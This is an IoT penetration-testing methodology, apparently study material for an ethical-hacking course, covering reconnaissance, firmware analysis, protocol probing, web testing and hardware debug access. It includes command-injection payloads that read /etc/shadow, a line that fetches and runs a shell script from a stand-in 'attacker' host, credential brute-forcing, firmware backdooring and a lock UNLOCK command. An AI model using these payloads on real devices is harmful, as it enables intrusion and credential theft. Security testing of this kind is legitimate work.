# IoT Security Testing Methodology

> Based on CEH Module 18 — IoT and OT Hacking

## Overview

IoT devices frequently ship with weak defaults, unpatched firmware, exposed debug interfaces, and insecure protocols. This methodology covers remote and physical attack surfaces across the full IoT stack: network services, firmware, web interfaces, wireless protocols, and hardware.

**Hardware Requirements**:
- Bus Pirate or FTDI adapter (UART/SPI/I2C)
- Logic analyzer (Saleae Logic or DSLogic)
- JTAG debugger (J-Link, ST-Link, or OpenOCD-compatible)
- SPI flash programmer (CH341A or FlashcatUSB)
- Multimeter for pin identification
- Soldering station with fine tip
- BLE sniffer: nRF52840 dongle or Ubertooth One
- SDR: RTL-SDR v3 or HackRF One (for sub-GHz protocols)
- Optional: Hot air rework station for chip removal

---

## Phase 1: Reconnaissance

### Internet-Facing Device Discovery

```bash
# Shodan — find specific device types
shodan search "Server: GoAhead-Webs" --fields ip_str,port,org
shodan search "product:camera country:US" --fields ip_str,port,hostnames
shodan search "port:1883 MQTT" --fields ip_str,port,org
shodan search "port:5683 CoAP" --fields ip_str,port

# Shodan CLI — search by known IoT banners
shodan search 'HTTP/1.1 200 OK\r\nServer: Boa' --fields ip_str,port
shodan search 'Hikvision-Webs' --fields ip_str,port
shodan search '"default password"' --fields ip_str,port,data

# Censys — search for IoT certificates and services
censys search "services.tls.certificates.leaf.subject.common_name: *camera*"
censys search "services.port: 1883 AND services.banner: MQTT"

# Nmap — local network IoT discovery
nmap -sn 192.168.1.0/24                        # Host discovery
nmap -sV -p- --open 192.168.1.100              # Full port scan of device
nmap -sU -p 53,67,123,161,5353,1900 192.168.1.100  # Common IoT UDP ports

# mDNS/SSDP discovery
avahi-browse -art                               # mDNS service discovery
gssdp-discover --timeout=5                      # UPnP/SSDP discovery
```

### Identify Device Information

```bash
# Banner grab services
nmap -sV --version-intensity 9 192.168.1.100

# Check for UPnP device description
curl -s http://192.168.1.100:49152/rootDesc.xml

# SNMP device info
snmpwalk -v2c -c public 192.168.1.100 1.3.6.1.2.1.1   # System info

# HTTP headers and server identification
curl -sI http://192.168.1.100/
curl -s http://192.168.1.100/ | grep -i 'firmware\|version\|model'

# MAC address vendor lookup for manufacturer identification
# Use the OUI from ARP: arp -n | grep 192.168.1.100
# Look up at https://maclookup.app/ or macvendors.com
```

---

## Phase 2: Firmware Analysis

### Firmware Acquisition

```bash
# Download from manufacturer website
wget https://vendor.com/firmware/device_v2.1.bin

# Extract from mobile app (APK often contains firmware update URLs)
apktool d companion_app.apk -o app_decompiled
grep -r "firmware\|\.bin\|\.img\|update" app_decompiled/

# Dump from flash chip via SPI (using flashrom)
sudo flashrom -p ch341a_spi -r firmware_dump.bin

# Dump via UART bootloader (if U-Boot is accessible)
# Connect UART, interrupt boot, then:
# U-Boot> md.b 0x9F000000 0x1000000    # Read flash contents
# U-Boot> sf probe 0
# U-Boot> sf read 0x80000000 0x0 0x1000000
# U-Boot> md.b 0x80000000 0x1000000

# Via JTAG/SWD (using OpenOCD)
openocd -f interface/jlink.cfg -f target/stm32f4x.cfg
# In telnet session:
# > flash read_image firmware_dump.bin 0x08000000 0x100000
```

### Firmware Extraction with binwalk

```bash
# Analyze firmware structure
binwalk firmware.bin

# Extract all recognized components
binwalk -e firmware.bin

# Recursive extraction (handles nested archives)
binwalk -eM firmware.bin

# Extract with specific signature scan
binwalk -e --dd='.*' firmware.bin

# Entropy analysis (detect encrypted/compressed sections)
binwalk -E firmware.bin
# High flat entropy = encryption; varied entropy = compression
```

### Filesystem Analysis

```bash
# After binwalk extraction, explore the filesystem
cd _firmware.bin.extracted/squashfs-root/

# Search for hardcoded credentials
grep -rn 'password\|passwd\|secret\|key\|token\|api_key' etc/
grep -rn 'password\|passwd' etc/shadow etc/passwd
cat etc/shadow                              # Check for password hashes
cat etc/passwd                              # Check for users and shells

# Find configuration files with secrets
find . -name '*.conf' -o -name '*.cfg' -o -name '*.ini' -o -name '*.json' | \
  xargs grep -l 'password\|secret\|key'

# Check for SSH keys
find . -name 'authorized_keys' -o -name 'id_rsa' -o -name '*.pem'

# Check for certificates and private keys
find . -name '*.pem' -o -name '*.crt' -o -name '*.key' -o -name '*.p12'

# Check web application files for vulnerabilities
find . -name '*.cgi' -o -name '*.php' -o -name '*.lua' -o -name '*.sh'

# Check startup scripts for interesting services
cat etc/init.d/*
cat etc/inittab
cat etc/rc.local

# Check for debug/backdoor accounts or services
grep -rn 'telnet\|debug\|backdoor\|test' etc/
strings usr/bin/* | grep -i 'backdoor\|debug\|secret'

# Look for busybox and determine available commands
ls -la bin/busybox
bin/busybox --help 2>/dev/null

# Examine custom binaries
file usr/bin/*
strings usr/bin/custom_daemon | grep -i 'password\|http\|key\|version'
```

### Firmware Modification and Repacking

```bash
# Modify the filesystem (e.g., add SSH key, change password)
echo 'root::0:0:root:/root:/bin/sh' > squashfs-root/etc/passwd

# Repack SquashFS
mksquashfs squashfs-root/ modified_rootfs.sqsh -comp xz -b 131072

# For JFFS2 repacking
mkfs.jffs2 -d squashfs-root/ -o modified_rootfs.jffs2

# Reflash via SPI
sudo flashrom -p ch341a_spi -w modified_firmware.bin
```

---

## Phase 3: Network Protocol Analysis

### MQTT (Port 1883/8883)

```bash
# Test for anonymous access
mosquitto_sub -h 192.168.1.100 -t '#' -v
# '#' subscribes to ALL topics

# Subscribe to specific topics
mosquitto_sub -h 192.168.1.100 -t 'home/sensors/#' -v
mosquitto_sub -h 192.168.1.100 -t '$SYS/#' -v       # System topics (broker info)

# Publish a message (test write access)
mosquitto_pub -h 192.168.1.100 -t 'home/lock/command' -m 'UNLOCK'

# With credentials
mosquitto_sub -h 192.168.1.100 -t '#' -v -u admin -P password

# Brute force MQTT credentials
ncrack -p 1883 --user admin -P /usr/share/wordlists/rockyou.txt 192.168.1.100

# Nmap MQTT scripts
nmap -p 1883 --script mqtt-subscribe 192.168.1.100
```

### CoAP (UDP Port 5683)

```bash
# CoAP resource discovery
coap-client -m get coap://192.168.1.100/.well-known/core

# GET request
coap-client -m get coap://192.168.1.100/sensor/temperature

# PUT request (modify a resource)
coap-client -m put coap://192.168.1.100/actuator/led -e '1'

# Observe a resource (subscribe to updates)
coap-client -m get -s 60 coap://192.168.1.100/sensor/temperature
```

### UPnP/SSDP (UDP Port 1900)

```bash
# Discover UPnP devices
gssdp-discover --timeout=5

# Manual SSDP M-SEARCH
echo -e 'M-SEARCH * HTTP/1.1\r\nHost: 239.255.255.250:1900\r\nMan: "ssdp:discover"\r\nMX: 3\r\nST: ssdp:all\r\n\r\n' | \
  socat - UDP-DATAGRAM:239.255.255.250:1900

# Fetch device description
curl -s http://192.168.1.100:49152/rootDesc.xml

# UPnP exploitation with miranda
sudo miranda
# msearch
# host list
# host get 0 deviceList
# host send 0 WANIPConnection AddPortMapping

# Check for UPnP IGD port forwarding abuse
upnpc -l                                    # List current port mappings
upnpc -a 192.168.1.50 22 2222 TCP          # Add port forwarding rule
```

### BLE (Bluetooth Low Energy)

```bash
# Scan for BLE devices
sudo hcitool lescan
sudo hciconfig hci0 up

# Using bluetoothctl
bluetoothctl
# scan on
# devices
# connect AA:BB:CC:DD:EE:FF

# GATTTool — read characteristics
gatttool -b AA:BB:CC:DD:EE:FF -I
# connect
# primary                           # List primary services
# characteristics                   # List characteristics
# char-read-hnd 0x000e             # Read a handle
# char-write-req 0x000e 0100       # Write to a handle

# BLE sniffing with nRF Sniffer
# Use nRF Connect or Wireshark with nRF Sniffer plugin

# Bettercap BLE enumeration
sudo bettercap
ble.recon on
ble.enum AA:BB:CC:DD:EE:FF
ble.write AA:BB:CC:DD:EE:FF 000e 0100
```

---

## Phase 4: Web Interface Testing

### Default Credentials

```bash
# Check common default credentials
# admin:admin, admin:password, admin:1234, root:root, user:user
# Check https://www.defaultpassword.com/ or https://cirt.net/passwords

# Brute force web login
hydra -l admin -P /usr/share/seclists/Passwords/Default-Credentials/default-passwords.txt \
  192.168.1.100 http-post-form \
  "/login:username=^USER^&password=^PASS^:Invalid credentials"

# Check for common IoT web paths
gobuster dir -u http://192.168.1.100 -w /usr/share/seclists/Discovery/Web-Content/IoT-device-paths.txt
curl -s http://192.168.1.100/cgi-bin/
curl -s http://192.168.1.100/goform/
curl -s http://192.168.1.100/HNAP1/
```

### Command Injection

```bash
# Common injection points in IoT web interfaces:
# - Ping/traceroute diagnostic pages
# - NTP server configuration
# - DNS server configuration
# - SSID/hostname fields
# - Firmware update URL fields

# Test payloads
;id
|id
$(id)
`id`
;cat /etc/passwd
|cat${IFS}/etc/shadow
;wget${IFS}http://attacker/shell.sh${IFS}-O${IFS}/tmp/s;sh${IFS}/tmp/s

# Inject via curl
curl -s 'http://192.168.1.100/cgi-bin/diagnostic.cgi' \
  --data 'ping_addr=127.0.0.1;id'

curl -s 'http://192.168.1.100/goform/setDiag' \
  --data 'pingAddr=127.0.0.1%0aid'
```

### API Fuzzing

```bash
# Discover API endpoints
ffuf -u http://192.168.1.100/api/FUZZ -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt

# Test for unauthenticated access
curl -s http://192.168.1.100/api/device/info
curl -s http://192.168.1.100/api/config
curl -s http://192.168.1.100/api/users

# Check for IDOR (Insecure Direct Object Reference)
curl -s http://192.168.1.100/api/user/1
curl -s http://192.168.1.100/api/user/2
```

---

## Phase 5: Hardware Attacks

### UART Console Access

```bash
# Identifying UART pins:
# 1. Visual inspection for 3-4 pin headers (GND, TX, RX, VCC)
# 2. Use multimeter:
#    - GND: Continuity with ground plane/shielding
#    - VCC: Steady 3.3V or 5V to GND
#    - TX: Fluctuating voltage (data being transmitted)
#    - RX: Steady high voltage (waiting for input)
# 3. Use logic analyzer to confirm baud rate

# Common baud rates: 9600, 19200, 38400, 57600, 115200

# Connect via screen
sudo screen /dev/ttyUSB0 115200

# Connect via minicom
sudo minicom -D /dev/ttyUSB0 -b 115200

# Auto-detect baud rate with baudrate.py
python3 baudrate.py -p /dev/ttyUSB0

# Common things to try once connected:
# - Press Enter during boot to get shell
# - Interrupt U-Boot bootloader (press key during countdown)
# - Default credentials: root/root, admin/admin, no password
```

### JTAG/SWD Debugging

```bash
# Identify JTAG pins using JTAGulator
# Or manually with logic analyzer during reset

# OpenOCD connection (example for STM32)
openocd -f interface/jlink.cfg -f target/stm32f4x.cfg

# In separate terminal, connect via telnet
telnet localhost 4444
# > halt                          # Halt CPU
# > reg                           # Dump registers
# > mdw 0x08000000 100            # Read memory
# > flash read_image dump.bin 0x08000000 0x100000   # Dump flash
# > resume                        # Resume execution

# GDB connection (OpenOCD starts GDB server on port 3333)
arm-none-eabi-gdb
# (gdb) target remote localhost:3333
# (gdb) monitor halt
# (gdb) x/100x 0x08000000
# (gdb) monitor flash read_image dump.bin 0x08000000 0x100000
```

### SPI Flash Dumping

```bash
# Connect CH341A SPI programmer to flash chip
# Identify flash chip model from markings

# Read flash contents
sudo flashrom -p ch341a_spi -r flash_dump.bin

# Verify read integrity (read twice and compare)
sudo flashrom -p ch341a_spi -r flash_dump2.bin
md5sum flash_dump.bin flash_dump2.bin

# Analyze the dump
binwalk flash_dump.bin
binwalk -e flash_dump.bin

# Write modified firmware back
sudo flashrom -p ch341a_spi -w modified_firmware.bin
```

### I2C/SPI Bus Sniffing

```bash
# Bus Pirate I2C scanning
# Connect Bus Pirate, open serial terminal
screen /dev/ttyUSB0 115200
# m        (select mode)
# 4        (I2C)
# 3        (100kHz)
# (1)      (search for I2C addresses)

# Logic analyzer capture
# Use Saleae Logic or PulseView to capture and decode I2C/SPI traffic
# Look for EEPROM reads that contain credentials or keys
```

---

## IoT Attack Surface Summary

| Layer | Attack Surface | Common Issues |
|-------|---------------|---------------|
| Cloud | API, Mobile-to-cloud | Weak auth, IDOR, insecure API |
| Network | MQTT, CoAP, HTTP, UPnP | No auth, cleartext, injection |
| Application | Web UI, Mobile app | Default creds, command injection |
| Firmware | OS, binaries, config | Hardcoded creds, old libraries |
| Hardware | UART, JTAG, SPI, BLE | Debug access, flash dump |
| Radio | Wi-Fi, BLE, Zigbee, Z-Wave | Sniffing, replay, jamming |

---

## Reporting Checklist

- [ ] Device model, firmware version, and architecture documented
- [ ] All open ports and services enumerated
- [ ] Default and hardcoded credentials tested
- [ ] Firmware extracted and analyzed for secrets
- [ ] Web interface tested for OWASP Top 10
- [ ] Network protocols tested for authentication and encryption
- [ ] Hardware debug interfaces identified and tested
- [ ] All findings rated by CVSS v3.1
- [ ] Remediation recommendations provided per finding
